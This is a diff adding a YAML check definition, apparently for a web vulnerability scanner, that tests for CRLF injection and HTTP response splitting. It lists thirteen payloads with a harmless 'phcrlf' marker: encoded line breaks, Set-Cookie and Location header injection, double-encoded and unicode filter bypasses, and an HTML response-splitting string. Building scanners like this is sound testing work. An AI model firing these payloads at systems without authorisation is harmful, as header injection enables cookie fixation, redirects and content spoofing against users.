@@ -1,0 +1,25 @@
+name: crlf
+description: CRLF Injection / HTTP Response Splitting (injeta header e o detecta na resposta)
+detectors: [crlf]
+
+transforms:
+  - raw
+  - url
+
+# o detector 'crlf' confirma se o header 'phcrlf' apareceu na resposta
+signatures: []
+
+payloads:
+  - { value: "%0d%0aphcrlf:injected", tags: [crlf] }
+  - { value: "%0aphcrlf:injected", tags: [lf] }
+  - { value: "%0d%0aSet-Cookie:phcrlf=injected", tags: [cookie] }
+  - { value: "%0d%0aLocation:phcrlf", tags: [location] }
+  - { value: "\r\nphcrlf:injected", tags: [raw] }
+  - { value: "\nphcrlf:injected", tags: [raw] }
+  - { value: "%23%0d%0aphcrlf:injected", tags: [fragment] }
+  - { value: "%3f%0d%0aphcrlf:injected", tags: [query] }
+  - { value: " %0d%0aphcrlf:injected", tags: [space] }
+  - { value: "%25%30%64%25%30%61phcrlf:injected", tags: [double-encoded] }
+  - { value: "%E5%98%8A%E5%98%8Dphcrlf:injected", tags: [unicode-bypass] }
+  - { value: "%u000d%u000aphcrlf:injected", tags: [unicode-iis] }
+  - { value: "%0d%0a%0d%0a<html>phcrlf", tags: [response-splitting] }
